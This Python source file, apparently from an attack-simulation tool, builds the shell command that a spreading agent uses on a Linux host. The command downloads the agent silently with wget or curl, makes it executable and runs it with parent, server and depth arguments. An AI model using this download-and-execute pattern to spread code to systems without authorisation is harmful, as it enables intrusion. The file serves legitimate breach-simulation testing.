from pathlib import PurePosixPath
from typing import Sequence

from agentpluginapi import (
    DropperExecutionMode,
    IAgentOTPProvider,
    ILinuxAgentCommandBuilder,
    LinuxDownloadMethod,
    LinuxDownloadOptions,
    LinuxRunOptions,
    LinuxSetPermissionsOptions,
)
from monkeytypes import AgentID

from .utils import build_monkey_commandline_parameters, get_agent_argument, get_agent_location


class LinuxAgentCommandBuilder(ILinuxAgentCommandBuilder):
    def __init__(
        self,
        agent_id: AgentID,
        servers: Sequence[str],
        otp_provider: IAgentOTPProvider,
        agent_otp_environment_variable: str,
        current_depth: int = 0,
    ):
        self._agent_id = agent_id
        self._servers = servers
        self._otp_provider = otp_provider
        self._agent_otp_environment_variable = agent_otp_environment_variable
        self._current_depth = current_depth
        self._command = ""

    def build_download_command(self, download_options: LinuxDownloadOptions):
        download_command_func = self._build_download_command_wget
        if download_options.download_method == LinuxDownloadMethod.CURL:
            download_command_func = self._build_download_command_curl

        self._command += download_command_func(
            download_options.download_url, download_options.agent_destination_path
        )

    def _build_download_command_wget(
        self, download_url: str, destination_path: PurePosixPath
    ) -> str:
        return f"wget -qO {destination_path} {download_url}; "

    def _build_download_command_curl(
        self, download_url: str, destination_path: PurePosixPath
    ) -> str:
        return f"curl -so {destination_path} {download_url}; "

    def build_set_permissions_command(self, set_permissions_options: LinuxSetPermissionsOptions):
        self._command += (
            f"chmod {set_permissions_options.permissions:o} "
            f"{set_permissions_options.agent_destination_path}; "
        )

    def build_run_command(self, run_options: LinuxRunOptions):
        if run_options.include_otp:
            self._command += (
                f"{self._agent_otp_environment_variable}={self._otp_provider.get_otp()} "
            )

        self._command += str(run_options.agent_destination_path)

        if run_options.dropper_execution_mode != DropperExecutionMode.SCRIPT:
            self._command += " " + self._build_agent_run_arguments(run_options)

    def _build_agent_run_arguments(self, run_options: LinuxRunOptions) -> str:
        agent_arguments = build_monkey_commandline_parameters(
            parent=self._agent_id,
            servers=self._servers,
            depth=self._current_depth,
            location=get_agent_location(run_options),
        )
        return f"{get_agent_argument(run_options)} {' '.join(agent_arguments)}"

    def get_command(self) -> str:
        return self._command

    def reset_command(self):
        self._command = ""
